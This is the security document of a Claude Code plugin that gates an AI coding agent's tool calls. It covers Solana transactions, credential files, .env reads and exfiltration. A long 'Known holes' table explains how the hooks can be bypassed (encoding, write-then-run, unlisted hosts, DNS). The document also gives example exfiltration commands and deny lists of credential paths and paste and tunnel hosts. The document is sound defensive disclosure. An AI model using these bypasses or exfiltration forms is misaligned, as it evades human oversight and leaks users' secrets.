# Security

## What this plugin cannot protect on its own

> [!WARNING]
> **safe-ai-skill's firewall is hook-level string analysis, and it has known holes.** A hook gets the text of a tool call before it runs (PreToolUse) or the tool's output after it ran (PostToolUse), and answers with no opinion, ask, deny or a rewritten output. That is all it can do. It can't see what a command does once it starts, can't stop a process the command spawns, and has no view of anything that doesn't go through a Claude Code tool call. Every gate is string and semantic analysis of model-written text. Each adversarial review round of this engine found new bypasses, and we don't think that tail is exhausted.
>
> **The [solana-ai-kit](https://github.com/solanabr/ai-kit) implementation (OS sandbox plus permission rules) closes most of these holes. Run both**, or run Claude Code's own sandbox with the recommended `denyRead` and `deniedDomains` entries below. A Claude Code plugin can't ship `sandbox` or `permissions` settings (Claude Code drops both keys from a plugin), so this plugin can't give itself the layer that would close most of them. That layer comes from your settings or from a kit that writes them.

The tier ([docs/tiers.md](docs/tiers.md)) changes how much this plugin denies, never what a hook can see. The tier `off` is not a switch that turns the hooks off, and `high` is not a sandbox.

### Project `.env` at Off, Relaxed and Medium

Since 1.2.0 the project's `.env` and `.env.*` follow solana-ai-kit's tiers: **the agent can read them at Off, Relaxed and Medium**, and only High denies the read. That is a trade-off, stated plainly: **if the model can see a value, it can leak it**, through channels a hook can't fully gate: a `WebFetch` URL or MCP argument to a host the exfil list doesn't name, an MCP server's own process, a DNS lookup, a file it writes and you later commit. The hooks deny the plain forms (a command line that reads an env file and runs a network command or network code, a secret file uploaded by path), but they can't follow a value once it is in the transcript. The control for that is egress: solana-ai-kit's sandbox `deniedDomains`, or Claude Code's sandbox with the entries below. If a project's values must stay out of the transcript, use High, or `safe-ai-skill tier --env-read deny` (every tier), or a repo's `secrets.env_read: deny`. Key material and credential stores stay denied at every tier; dotenvx private keys (`.env.keys`, `.env.*.keys`) and project env files whose content holds key material count as key material. Only the session's project counts: a `cd` to another repository, a nested repository, or a session rooted at your home or above keeps the deny at every tier.

**Containers, key files, permission prompts and the session report.** Four additions, each documented per tier in [docs/tiers.md](docs/tiers.md).
- *Container privilege guard.* A `docker`, `podman`, `nerdctl` or `finch` run, create or exec, or a compose `up`/`run`/`create`, that hands the container host-level access (privileged mode, extra capabilities, host namespaces, devices, mounts of the host root, system directories, your home, credential stores or runtime sockets) asks, and is denied at High and when headless. Compose files are read. Not seen: a compose file on standard input, `COMPOSE_FILE`, `include:`/`extends:` files, Kubernetes manifests, a flag held in a variable.
- *Key-file hygiene.* A SessionStart notice lists key and secret files that git tracks, that no ignore rule covers, or (private keys) that are group/world-readable; staging one with `git add`, `commit -a` or `stash` asks at Off and Relaxed and is denied from Medium. It protects against the agent staging a key, not against a key already committed or one reached by a path the gate cannot read (a pathspec in a variable, a non-default `core.excludesFile`). Ecosystem formats such as a Solana keypair JSON are covered only where the engine's secret-name rules name them, until a domain pack supplies them.
- *`PermissionRequest` hardening.* A hard-guard call is re-judged when Claude Code is about to prompt, and denied when nobody would see the prompt or when an auto-approving mode would let a denied call through. In an interactive default-mode session the decision stays with you, with a one-line warning only: Claude Code cannot add text to the dialog, and how this hook ranks against other `PermissionRequest` hooks or a host's permission prompt tool is not documented. The hook never allows.
- *Session report.* Informational, never a control. It records what the firewall decided in a session and shows a one-line recap of a flagged session at the next start in the same project. It keeps a hash of the project root, not the path, and redacted reasons. It is not an audit trail: a killed session leaves no report, a forked session has no start marker, grants used are visible only for budgeted scopes, and the spend figure includes any concurrent session. The audit log remains the record.

### Known holes

Kit columns describe solana-ai-kit 2.4.0 (rule set 7). The scope split between the kit and this plugin is proposed in [ai-kit#264](https://github.com/solanabr/ai-kit/issues/264) and its docs in [ai-kit#265](https://github.com/solanabr/ai-kit/issues/265); the kit still pins safe-ai-skill 1.0.0 until it moves its pin.

| Hole | Why a hook can't close it | What closes it | Still open with the kit |
|---|---|---|---|
| **Cross-call write-then-run.** A script written with Write or `cat > x.sh` in one call, run by name in a later call. | Each call is judged alone. The call that runs `./x.sh` contains no secret path and no Solana verb. (1.1.0 links a script written and run in the same command line, not across calls.) | **Kit sandbox (Relaxed and up):** `denyRead`, `denyWrite`, the `allowWrite` fence and `deniedDomains` apply to the script's own syscalls, whoever wrote it. | A script run from a command line led by one of the kit's `excludedCommands` (`surfpool`, `anchor test`, `git push/pull/fetch`, `gh pr/run/issue`) runs unsandboxed. So does anything `anchor test` starts. |
| **Encoding and indirection.** `base64 -d`, `$'…'` quoting, `G=solana; $G transfer …`, paths built at runtime, `python3 -c` or `node -e` one-liners. | The forms are unbounded. A parser recognises the forms it was written for. 1.1.0 follows common wrappers and `FOO=1` prefixes and treats unreadable Solana-family code as an `ask` (a `deny` at High), which narrows this, not closes it. The encoded-command gate then decodes literal payloads (`base64 -d`, `base32`, `basenc`, `xxd -r`, hex `printf`, `$'…'`, `openssl`, `rev`) piped, here-stringed, `eval`'d, written then run, or decoded in a `python`/`node` one-liner into a shell, and judges the decoded text with every Bash gate, as if it had been typed. A payload it can't read asks (deny at High). | **Kit sandbox**, as above. **Kit High** also turns on `blockReadsOutsideWorkingDirectories`, which makes Claude Code ask on an interpreter one-liner whose path it can't resolve. | On-chain gating has no sandbox equivalent: a disguised `solana transfer` is stopped only if a parser recognises it. The kit's own hook parser has similar open evasions, which it documents. |
| **Paths inside interpreter code.** `python3 -c`, `node -e`, `perl -e`, an awk program and code on stdin are scanned for env-file and credential paths: escapes (`\x2e`, `\56`, `\u002e`) are decoded and same-quote literals joined (`'.e' 'nv'`, `'.e'+'nv'`). Not decoded: literals joined across quote types (`'.e' "nv"`), Python named escapes (`'\N{FULL STOP}env'`), and paths built at runtime (`chr(46)`, `os.path.join`, a script file). A mention counts as a read (`print('.env')` follows the env-read tier row), as a write too when the code holds a write call (`write`, `append`, an `'a'`/`'w'` mode, …), and as a send when it holds network code, and data scripts holding thousands of distinct path-shaped strings (URLs, file lists) take longer to inspect or ask as too complex. | The scan reads text, not the language; it can't run the code to see which file opens. | **Kit sandbox `denyRead`** on the env and credential paths. | `.env` (the kit has no `.env` rule): add it to your own `denyRead`. |
| **Same-UID code outside the sandbox.** A subprocess, compiled helper, test suite, `build.rs`, postinstall script or MCP server process reading `~/.ssh`, `.env` or a keypair, or rewriting this plugin's grants, pins, tier file or shim. | Hooks see tool calls, not processes. This plugin's state lives in user space. The HMAC makes tampering detectable, not impossible. | **Kit sandbox** for processes started by sandboxed Bash: `denyRead` on credentials, and writes outside `allowWrite` refused, which keeps Bash out of `~/.claude/plugins/data` [unverified: follows from the kit's `allowWrite` list, not tested]. **Kit permission rules:** `Edit(/.safe-ai-skill/**)` at every tier, and `Edit()` deny on `~/.claude/plugins/` at High. | MCP server processes run outside the sandbox at every tier, and so do excluded commands. `anchor test*` and `surfpool *` run unsandboxed with access to the home credential stores; only a container closes that. The kit gates `context-mode` by hook and denies some MCP executors by name at Medium and High. Every other server is ungated. |
| **Values already in context.** Once a secret has been read, printed by a test, or returned by an MCP tool, it has gone to the model provider and into `~/.claude/projects/**/*.jsonl`. From there it can reach memory and indexing plugins, MCP tool arguments, and files the agent writes and later commits. | A hook can stop a read. It can't recall a value. Redaction rewrites only the successful tool output it is shown, and misses low-entropy secrets under neutral key names. A failed tool call (a Bash command that exits non-zero, an MCP or Read error) fires `PostToolUseFailure` instead, whose only output is added context: its raw output reaches the model unredacted, and `failure-notice` can only warn the model and you. | **Nothing closes the provider path.** **Kit Medium and High** deny commands reading transcripts back (`denyRead` on `*.jsonl`). This plugin denies the Read tool on `~/.claude/projects/**`. | All of it, at every tier. The only control is not reading the value. Since 1.2.0 a project `.env` the agent reads at Off, Relaxed or Medium is in this category; High, or `env_read: deny`, keeps it out. |
| **Egress.** `WebFetch https://sink.example/?d=<value>` to a host that is not on the exfil list, a value encoded into a hostname lookup, a raw IP literal (`curl https://203.0.113.5/`), a redirect, a fresh request-bin or tunnel domain, `WebSearch`, `git push` to a remote configured in an earlier call, publishing. | The exfil tripwire ([#19](https://github.com/solanabr/safe-ai-skill/issues/19)) analyses command text and tool arguments, which a runtime-built command defeats. It denies a request to a host on the tier's exfil list (from Relaxed; Bash network commands, interpreter one-liners, MCP `url`/`uri`/`href` arguments, browser scripts and `WebFetch`), denies secret-shaped data sent to a host that isn't a developer service (also after base64, hex or percent decoding), and asks on encoded blobs, paste-host downloads, a `git push` to a remote added on the same line and a browser script that sends cookies or storage. Since 1.2.0 it also denies, at every tier, a secret file sent by path (`curl -d @.env`, `-T`, `-F`, `scp`) and env data that can flow into a network sink (a pipe, input redirect or `$(…)` into a network command, an env file loaded into the shell and then expanded into one, a loader whose child reaches the network, `> /dev/tcp/…`, interpreter code that reads it and opens a network client). It asks on an inline `curl`/`wget` POST to a non-localhost host (below High, an inline body to a known Solana RPC host has no opinion). It doesn't stop an unlisted host, an IP literal that carries no secret-shaped data, a secret without a recognisable shape, or a redirect; `WebSearch` is not hooked, and DNS is not a tool call. | **Kit sandbox `deniedDomains`** (the same 70/79/84 known request-bin, tunnel and paste hosts, enforced at the syscall) for sandboxed Bash subprocesses. **`egress-guard`** blocks secret files sent by `curl`/`wget` at Relaxed and up, and the kit gates git publish and force push. | WebFetch: the kit allows `WebFetch(*)`, and whether `deniedDomains` applies to it is [unverified]; this plugin's `gate-webfetch` covers only the listed hosts and key-shaped data. Close the rest with `WebFetch(domain:…)` deny rules in your own settings. DNS exfiltration through either layer: [unverified]. A denylist covers only the hosts on it. An allowlist (`strictAllowlist`) works only from user or managed scope, never from project files. |
| **Bash writes to `.env`.** A write the parser can't see: a script written earlier, encoded or runtime-built commands. | Write, Edit and MultiEdit to a project `.env`/`.env.*`, an agent-run `env set\|unset`, and the Bash writes the hooks recognise (`>`/`>>`, `tee`, `truncate`, `sed -i`, `perl -pi`, `rm`/`mv`, `cp` onto it, `dd of=`, interpreter code with a write call) are denied at Medium; other env files at Medium and High. Anything else isn't recognised as a write. | **Kit sandbox `denyWrite`** at Medium. Add `**/.env` to your own `denyWrite`. | Shell writes the sandbox skips (the kit documents that Linux and WSL2 skip wildcard write entries). |
| **Directory search.** Grep and Glob are not in the default toolset on native Claude Code 2.1.304 (observed), so searches go through Bash `grep`/`rg`. | 1.1.0 appends credential exclusions to a directory Grep, including one rooted at or above `$HOME`, which closes the 1.0.1 leak where a directory-wide Grep could return `.env*` contents. When a search goes through Bash, the secrets gate pattern-matches reader commands, which the spec calls a nudge, not the control. | **Kit permission rules:** `Read()` deny covers Read, Grep and Glob for credential paths at every tier. **Kit sandbox `denyRead`** covers `grep`/`rg` on those paths at Relaxed and up. | The kit has no `.env` rule, so a Bash `grep -r KEY .` can return `.env` contents. Add `.env` to your own sandbox `denyRead` (below). |
| **A localhost RPC proxy that forwards to mainnet.** | Clusters are identified by host, so a proxy on `localhost` counts as an identified localnet. | Nobody. Simulation and a guarded signer are out of scope. | All of it. |
| **Engine crash.** | The confidentiality gates (`gate-read`, `gate-bash-secrets`, `gate-tamper`, `gate-webfetch`) run with `onFailure: continue`, so a crash fails open with one stderr line. `gate-bash-secrets` also carries the exfil, download-and-run, env-dump, encoded-command and tamper-content checks for Bash. `gate-bash` (which runs for every Bash call), `gate-mcp` and `gate-skill` block, so a crashing engine blocks every Bash call. | **Kit sandbox**, which doesn't depend on the engine. | Everything the sandbox doesn't cover. |
| **Env files loaded into a process.** A short allowlist of loaders may name an env file: `node`/`bun --env-file F <script>`, `deno run --env-file F <script>`, `docker run`/`create --env-file F <image>` with no command, `docker compose --env-file F up` (and `start`, `restart`, `build`, `pull`, `down`, `stop`, `ps`, `logs`), and `dotenv`/`dotenvx` running one of those or a build tool (`npm start`/`test`/`run <name>`, `pnpm`, `yarn`, `next`, `vite`, `anchor`, `cargo`, `make`). The values go into the process, not the transcript. | **An exempted loader runs project code the agent can edit**: the script file, `package.json` scripts, a Makefile, a build script, the image. The exemption cannot stop that code from printing the loaded values once it runs; it only refuses the forms that print on the command line (inline code, `data:`/`http(s):` modules, piped input, a command after the image, `exec`/`dlx`/`env` and other compose subcommands). | **Kit sandbox** (or Claude Code's own) with `.env` in `denyRead` is the control: a sandboxed loader then cannot read the file at all. Values that reach the output are redacted only when they are literal values of the project's env files. | A loader the kit excludes from the sandbox (`excludedCommands`) still reads the file. |
| **Code run through an MCP executor.** context-mode's `ctx_execute` and similar tools run shell or Python code given as an argument. | Shell code (`ctx_execute` with a shell language, `ctx_batch_execute` commands, any `command`/`cmd`/`script` argument) gets the Bash checks. Other languages get only their string literals checked, as paths and as shell commands; a Solana CLI named there asks (deny at High). Paths built at runtime, encodings and imported code are not seen. | **Kit hooks** gate `context-mode` payloads; the kit denies some MCP executors by name at Medium and High. | MCP server processes run outside the sandbox. |
| **Output redaction limits.** The `redact` hook rewrites the result of `Bash`, `Read`, `Grep` and MCP tools (matcher `Bash\|Read\|Grep\|mcp__.*`). Results of other tools (`WebFetch`, `WebSearch`, `Agent`, `Glob`, the Windows `PowerShell` tool) are not scanned. Seed phrases (BIP-39 English list, any case; words joined by whitespace, `,` `"` `'` `[` `]` or numbering such as `1.` `2)`): **without a keyword**, each line of list words is checked on its own, as is a run of list words that wraps over lines: it is redacted when it is exactly 12, 15, 18, 21 or 24 words and its checksum validates, or when it is at most 18 words and a checksum-valid window sits with no more than 3 extra list words on each side (and at least 8 distinct words), so a file of one phrase per line has every line redacted; a phrase with 4 or more list words directly beside it, two phrases written back to back on one line, a typo, another language's list or non-list words are missed. **With a keyword** (`mnemonic`, `seed`, `phrase`, `recovery` or `secret` as a whole word, plural or camelCase part, in the same string and outside the run itself; a keyword among the first or last 3 words of a list or phrase-shaped run, as in `seed phrase <words>`, is cut off the run and counts), a run of 12 to 48 list words is redacted whatever its checksum, so is a run of 12 to 48 words of 3 to 8 letters joined as above in which at most one in six is off the list and those are lowercase (typos), and so is any run of 12 or more lowercase 3-to-8-letter words separated by single spaces with the keyword outside it (the 1.0 rule: the whole run up to 48 words, else its first 24). A wrapped run, or a single line, of more than 48 list words is taken for a wordlist: neither the whole-run checksum nor the keyword rules redact it (only the 1.0 rule can still take the first 24 words of a single-spaced run that also holds a non-list word); the lines inside a longer multi-line block are still checked one by one. "Same string" means one JSON string of the tool result: a keyword in `stderr` does not apply to `stdout`, and each MCP content block is separate. Prose made only of 12 to 18 list words in a row can be redacted by chance (1 in 16 per 12-word window, 1 in 256 at 24), and the keyword rules redact ordinary clauses such as `decrypts the given secret box using the key and the nonce` when they are 12 or more short lowercase words; the repository's docs and the reviewer's corpora of natural text and code had no bare match outside test fixtures. The checksum work per string is capped at 349,525 exact-length and 2,097,152 window checks, which is more than any run layout in an 8 MiB payload can use, so padding before a phrase cannot exhaust it. Published BIP-39 test vectors are redacted in output like any other phrase (a test fixture holding one is hidden from the model). The prompt guard blocks only checksum-valid phrases (the bare rules above), never on a keyword alone, and lets the 24 published BIP-39 English test vectors through when one is the whole match; a pasted phrase with a typo is therefore not blocked. A payload over 8 MiB, an engine crash or a hook timeout (10 s) passes the output unchanged (`onFailure: continue`). | Claude Code's `updatedToolOutput` (hooks reference, "PostToolUse decision control") replaces only what Claude sees: the tool has already run, and telemetry such as OpenTelemetry tool spans captures the original output before the hook runs. For built-in tools a replacement that does not match the tool's output schema is ignored, so the hook keeps every field and type and changes string values only. The reference does not say whether the transcript file stores the original or the replaced result. | Not reading the value: the read gates, and the **kit sandbox** `denyRead`. | All of it. |
| **Heuristic evasion in packs.** A skill pack that evades the rule-based scan. | The scan is static analysis of text. Dependency findings (build and install scripts, floating sources) are reported, never denied. A pack's git history is read by `verify check`, `add` and `install`, not by the SessionStart sweep. | Pins and drift detection narrow it. The kit's CI review covers kit packs only. | Packs outside the kit. |

**Not yet covered by the hooks (full-coverage work).** Destructive and system commands (shutdown, mass deletes beyond the wallet gates), process kill, a publish gate (`npm publish`, `cargo publish`), `docker` cleanup, and reads of shell history files pass the hooks with no opinion. Sandbox `denyRead` on the history files (the settings manager writes it) covers sandboxed commands only. Three exfiltration items stay open: an interpreter one-liner that sends a key file, an inline `curl`/`wget` POST to an unknown host (it asks at every tier and is not denied at High), and an environment variable read inside a URL at High. The git and `gh` guard, the tamper and `ConfigChange` additions, the MCP tool-name denies, the High download-and-run rules and the extra credential-read rules are described per tier in [docs/tiers.md](docs/tiers.md). Their limits: the `ConfigChange` guard sees only the settings file as it now is, so a removal of the plugin entry or of a guard hook is not seen by it (the write-time tamper deny still sees it); the git guard does not follow a subcommand or `gh api` endpoint held in a variable, text assembled at run time or git run from a script file; and the credential-store rules read the hook's own environment, not an assignment typed in the command.

Holes neither layer closes from inside a project:
- a repository's committed `.claude/settings.json` `env` block, which can replace any hook through `PATH` or loader variables (Claude Code's folder trust is the only control);
- the `--settings`, `--permission-mode` and `--setting-sources` flags, and `CLAUDE_CONFIG_DIR`;
- PowerShell-only Windows, where the engine fails open and Bash matchers don't see the PowerShell tool;
- your own `!` shell commands [unverified whether any hook fires];
- the nonce secrecy of a confirmation code if a hook `systemMessage` reaches the model (checked live before each release).

**Known cost, not a hole.** Reads of `~/.claude/projects/**` are denied, and that includes the agent's own auto-memory files (`~/.claude/projects/<project>/memory/…`). The agent can't read them with its tools. The deny covers the whole tree because it also holds the transcripts that record hook messages.

**What 1.0.1 listed as known limitations, in 1.1.0.** Output redaction works at every tier, on successful tool results only (failed ones are a known hole, above). A directory-wide Grep gets credential exclusions (above). A Solana command behind a wrapper or `FOO=1` prefix is parsed and gated (`gate-bash` now runs for every Bash call); one written to a file in one call and run in a later one is still not seen. Writes to `.env` through Bash, and exfiltration to unlisted or listed hosts and raw IPs, were still open (the exfil tripwire closes the listed-host case; see above).

### Codex and opencode (experimental)

The Codex and opencode adapters ([docs/adapters.md](docs/adapters.md)) run the same gates on those clients' hook calls, with known gaps on top of the holes above: neither client can ask, so every `ask` is a deny; neither has Claude Code's sandbox, so its sandbox-dependent rows count as off; confirmations work only in a Claude Code session; Codex runs a call whose hook command cannot start, and its `write_stdin` can feed an interactive session the gates never see (interactive starts are denied, not all of them are recognised); an opencode plugin that fails to load is skipped silently, and plugins that run after it can change a call's args. Both adapters deny agent writes to their hook config, the engine, Claude Code's settings and the shell startup files, judged on the command's words. Neither adapter is part of the support contract yet.

### Recommended setup

Use one of these alongside the plugin:

1. **Recommended: run both, this plugin and solana-ai-kit at Relaxed or above.** The kit generates the sandbox, permission rules and exfil host list that close the holes marked "Kit sandbox" and "Kit permission rules" above, and its four guard hooks cover git, publish and fetch-and-execute. This plugin now has hook-level counterparts for git and `gh`, fetch-and-execute at High and MCP tool names, but not for publish. Prefer Medium or High when reading untrusted code.
2. **Without the kit: Claude Code's own sandbox**, configured by you, with the `denyRead` and `deniedDomains` entries below. Put this in `~/.claude/settings.json` (user scope), not in a project file. A project's `.claude/settings.local.json` can set `sandbox.enabled: false` or widen `allowRead`.

```json
{
  "sandbox": {
    "enabled": true,
    "filesystem": {
      "denyRead": [
        "~/.ssh", "~/.gnupg", "~/.aws",
        "~/.config/solana/id.json",
        "~/.netrc", "~/.npmrc", "~/.git-credentials", "~/.config/gh/hosts.yml",
        "~/.claude/projects",
        "**/.env", "**/.env.local", "**/*-keypair.json"
      ],
      "denyWrite": ["**/.env", "**/.env.local"]
    },
    "network": {
      "deniedDomains": [
        "webhook.site", "*.webhook.site", "*.requestbin.net", "*.pipedream.net",
        "*.ngrok.io", "*.ngrok-free.app", "*.trycloudflare.com",
        "pastebin.com", "transfer.sh", "0x0.st", "file.io"
      ]
    }
  },
  "permissions": {
    "deny": [
      "Read(~/.ssh/**)", "Read(~/.aws/**)", "Read(~/.config/solana/id.json)",
      "WebFetch(domain:webhook.site)", "WebFetch(domain:pastebin.com)"
    ]
  }
}
```

Notes on that snippet:
- **Check the glob syntax** (`**/.env`, `*.webhook.site`) against your Claude Code version's sandbox documentation [unverified across versions].
- **Expect sandboxed commands that sign with the default wallet to fail** once `~/.config/solana/id.json` is denied. Point `--keypair` or Anchor's `wallet =` at a dedicated devnet key outside the denied set, or run those commands yourself.
- **Expect sandboxed commands that load `.env` themselves** (a test run with dotenv, for example) to fail under `denyRead` on `**/.env`. If you need them to run, drop that entry and accept the subprocess hole this plugin can't close.
- **`denyWrite` on `**/.env` also stops a sandboxed `safe-ai-skill env set`.** Run that from your own terminal.
- **The domain list is a sample.** The full list is `policy/shared/exfil-hosts.list` in this repo (70, 79 and 84 hosts by tier). `safe-ai-skill doctor` checks your sandbox settings and prints a `denyRead` snippet generated from the shared credential list; it does not print `deniedDomains`.
- **Don't add a `denyRead` for `.env.schema` or `.env.example`.** This plugin keeps both readable on purpose.

### Admin lock-down

An organization can force safe-ai-skill on and keep users and repositories from switching it off by delivering [managed settings](https://code.claude.com/docs/en/managed-settings.md): the settings Claude Code applies above every user, project and local value. Delivery is a server-managed policy from the claude.ai admin console, an MDM policy, or a `managed-settings.json` (plus an optional `managed-settings.d/` directory) at `/Library/Application Support/ClaudeCode/` on macOS, `/etc/claude-code/` on Linux and WSL, or `C:\Program Files\ClaudeCode\` on Windows. By default Claude Code applies only the highest-ranked managed source that delivers a policy key; `managedSourcesBehavior: "merge"` combines them. The plugin side is documented in [Manage Claude Code plugins for your organization](https://code.claude.com/docs/en/plugins/org.md). Key names below are from those two pages and the [settings reference](https://code.claude.com/docs/en/settings-reference.md); check them against your Claude Code version.

A starting policy, to adapt:

```json
{
  "extraKnownMarketplaces": {
    "safe-ai-skill": { "source": { "source": "github", "repo": "solanabr/safe-ai-skill" } }
  },
  "enabledPlugins": { "safe-ai-skill@safe-ai-skill": true },
  "strictKnownMarketplaces": [
    { "source": "github", "repo": "solanabr/safe-ai-skill" },
    { "source": "skills-dir" }
  ],
  "disableSideloadFlags": true,
  "allowManagedHooksOnly": true,
  "disableAllHooks": false,
  "allowManagedPermissionRulesOnly": true,
  "sandbox": { "enabled": true, "allowUnsandboxedCommands": false, "failIfUnavailable": true }
}
```

- **Force-enable.** `extraKnownMarketplaces` registers the marketplace and `enabledPlugins` (`plugin@marketplace`) installs and enables the plugin at the next session. A user's own `false` does not stop it, because managed settings take precedence. Add your own marketplaces or the `strictKnownMarketplaces` allowlist as your policy requires; with any allowlist set, keep the `skills-dir` entry or skills-directory plugins stop loading, and register every marketplace you allow explicitly.
- **Lock hooks.** `allowManagedHooksOnly` (managed only) limits hooks to those your organization deploys, plus hooks from plugins your managed settings force-enable, so safe-ai-skill's hooks still run and a user-installed plugin's or repository's do not. `disableAllHooks` is a separate key: set outside managed settings it narrows hooks to the managed ones, and the docs do not say whether that spares a force-enabled plugin's hooks [unverified], so also set `"disableAllHooks": false` in the managed file and confirm with a test session that the safe-ai-skill hooks fire. `disableSideloadFlags` rejects `--plugin-dir`, `--plugin-url` and `--mcp-config` at startup. A side effect to know: when `disableCommandPluginSources` is unset it follows `allowManagedHooksOnly`, which turns off plugins with a `command` source.
- **Lock the sandbox and permissions.** `sandbox.enabled`, `sandbox.allowUnsandboxedCommands` and `sandbox.failIfUnavailable` are settings that managed policy outranks. `allowManagedPermissionRulesOnly` makes managed settings the only source of permission rules, and `sandbox.network.allowManagedDomainsOnly` and `sandbox.filesystem.allowManagedReadPathsOnly` do the same for domains and read paths. Put the credential and exfil entries from [Recommended setup](#recommended-setup), or the block `safe-ai-skill firewall show` prints for your tier, into the managed file; the settings manager writes a project's local file, which managed policy outranks and which a user can edit.
- **What this does not do.** Managed settings keep the plugin loaded; they do not make it a sandbox, and every hole above stays. The tamper tripwire already denies an agent's edit of a managed-settings file, but a human administrator account or a process outside Claude Code can change it. A `SAFE_AI_SKILL_DISABLE` value in a user's own `settings.local.json` is still honoured by the shim (see Design guarantees); nothing in this policy changes that, and whether a managed `env` entry can override it is untested [unverified]. The tier file stays user-scope, so the tier a user picks is theirs; an organization that wants a higher floor can try `SAFE_AI_SKILL_TIER` in the managed `env` block, which can only raise the tier [unverified in a managed source].

### Using with solana-ai-kit

The kit's `stbr` marketplace installs this plugin. Don't add this marketplace too: with two copies installed, only one copy's hooks register. The kit pins a specific commit of this plugin, so a release here reaches kit users only when the kit moves the pin.

**Division of labour** (see [docs/tiers.md](docs/tiers.md)):
- **The kit enforces:** the OS sandbox, permission rules, tier selection, and its git, publish, fetch-and-execute, `gh` and MCP tool-name gates. This plugin has hook-level counterparts of the git, `gh`, fetch-and-execute and MCP tool-name rules (not publish), kept as defence in depth.
- **This plugin enforces:** cluster-aware on-chain gates, spend caps and grants, key material and home credential store read blocking, `.env` tooling and redaction, and the session-start supply-chain check. A best-effort exfil tripwire ([#19](https://github.com/solanabr/safe-ai-skill/issues/19)) denies requests to listed exfil hosts and secret-shaped data sent out; the kit's sandbox `deniedDomains` (or your own) covers the same hosts at the syscall.
- **Duplicated hard denies are kept as defence in depth,** for example default-wallet `solana-keygen --force`, and irreversible actions on mainnet or an unidentified cluster. Two denies never conflict.

**The tier is an input.** One user-scope tier file, written only by `safe-ai-skill tier <t> [--project]` (a proposed kit change has `/firewall` run it). Raising applies at once. Lowering applies only after a confirmation you type in the prompt. The kit's `.claude/security.json`, repo policy files and env variables can only raise the tier, because a project file or the agent can rewrite them. A project `.env`/`.env.*` follows the tier: readable at Off, Relaxed and Medium, read-denied at High, and write-denied at Medium (see [above](#project-env-at-off-relaxed-and-medium)).

**Duplicate prompts.** Both hook sets run on every Bash call. Claude Code is expected to merge hook decisions as deny > ask > allow, so you should see one dialog [unverified on current Claude Code]; the shared conformance corpus asserts that no action is both asked by the kit and asked or allowed by this plugin in the end state. Until the kit moves to the split, the reason text can come from either engine, and a plugin `allow` (a grant, a within-cap devnet transfer) can be overridden by a kit `ask`. Under `claude -p` every ask is a denial, in both layers.

## What is protected

**Transactions and deploys.** Every `solana`, `spl-token`, and `anchor` CLI command that moves value, changes program authority, deploys or upgrades a program, or closes an account is intercepted before execution by the `gate-bash` PreToolUse hook, which runs for every Bash call so that wrapped forms (`env FOO=1 …`, `bash -c '…'`, `timeout 5 …`, path-qualified binaries) reach it too. Value-moving, authority-changing, and staking MCP tool calls (a tool name or routed `action`, also nested under `params`/`args`/`payload`, matching `mcp.sensitive_name_pattern`: `transfer`, `sign`, `swap`, `send`, `withdraw`, `burn`, `pay`, `upgrade`, `stake`, `delegate`, `mint`, `bridge`, `lend`, `borrow`, `trade`, … and, on wallet, Solana or DeFi-named tools only, `deposit`, `execute`, `submit`, `authority`, `launch`, `deploy`, `close`) are intercepted by `gate-mcp` (ask, deny at High). Staking and token transfers are hard guards there. Hard guards are never relaxed: authority changes and account closes ask for user approval (they deny at the High tier on mainnet or an unidentified cluster), and reads of key material and credential stores are denied. Authority changes include `stake-authorize`, `vote-authorize-voter`/`-withdrawer`, `authorize-nonce-account`, `stake-set-lockup`, `vote-update-validator`, `create-stake-account`/`create-nonce-account` with an authority flag, and `spl-token approve`/`authorize`. `spl-token` and MCP token amounts are token units: no SOL cap or grant covers them, and they ask on mainnet or an unidentified cluster (deny at High); an identified devnet, testnet or localnet has no opinion. A mainnet deploy asks (deny at High) and a confirmed `deploy` grant can allow it below High. A command line chaining two or more gated actions is never covered by a grant. Irreversible actions (`--final`, `program close` (program or buffer), `spl-token close-mint|close|burn`, `authorize --disable`, IDL erase/close, `close-vote-account`) deny on mainnet or any cluster not positively identified as localnet, devnet or testnet, and ask on an identified localnet, devnet or testnet; default-wallet destruction (`solana-keygen --force`, overwriting or deleting `id.json`) denies on every cluster. Nothing relaxes these: not a grant, a tier, a repo setting or an env variable. See [docs/tiers.md](docs/tiers.md).

**Secret files and credential stores.** Solana keypairs, `.pem` files and `~/.config/solana/**` (except `cli/config.yml`), `~/.ssh/**` (except `config`, `known_hosts`, `*.pub`), `~/.gnupg`, `~/.aws`, `~/.kube/config`, registry and git-host tokens, keychains and password-manager stores, browser profiles and wallet-extension data are read-denied by `gate-read` for Read and Grep tool calls (Glob lists names only and is not gated) and MCP path arguments and by `gate-bash-secrets` for Bash commands, at every tier including Off. So are commands that print a credential (`gh auth token`, `git credential fill`, `security find-generic-password -w`, `op read`, `bw get`, …). A directory Grep gets credential exclusions appended; a Grep rooted in a credential store is denied. A [varlock](https://varlock.dev) `.env.schema` and `.env.example` stay readable, but a Read (or Grep with a file path) of a schema that holds key material or a literal credential value, is over 64 KiB or is not a regular file is denied; Bash `cat` and Grep with a directory plus glob are not content-checked. A project's `.safe-ai-skill/policy.yaml` can remove either allow. Raw reads of the project's `.env`/`.env.*` follow the tier (open at Off, Relaxed and Medium, denied at High; `safe-ai-skill tier --env-read deny` denies them at every tier); other env files (`*.env`, `.envrc`, `.dev.vars`, the Solana CLI config, env files outside the project) are denied at every tier. Naming an SSH key as the identity of `ssh`, `scp` or `sftp` is allowed; any other command naming a credential store is denied. Details are in the README and docs/tiers.md. Output redaction runs on every tier: key, seed, PEM and vendor-token patterns and the literal values in the project's env files are replaced in Read, Bash, Grep and MCP output (the Read response of a raw read the tier permits keeps its values, so an Edit can't write a marker back). Its limits are listed under Known holes. It misses low-entropy secrets under neutral key names. Environment dumps are handled separately: reading `/proc/*/environ`, `ps e` and printing a secret-named variable (`echo $HELIUS_API_KEY`, `printenv NAME`) are denied at every tier; a bare `printenv`, `env` or `export -p` is allowed and the PostToolUse hook blanks the values of secret-named variables in its output; piping a dump into anything but a line filter such as `grep`, or writing it to a file, asks. `.env.production` and `.env.prod*` are read-denied from Relaxed up.

**Prompt content.** `prompt-guard` (UserPromptSubmit hook) blocks prompts that contain raw private keys or seed phrases before they reach the model. Only checksum-valid phrases block, and the 24 published BIP-39 English test vectors don't; the seed-phrase rules are under Known holes ("Output redaction limits").

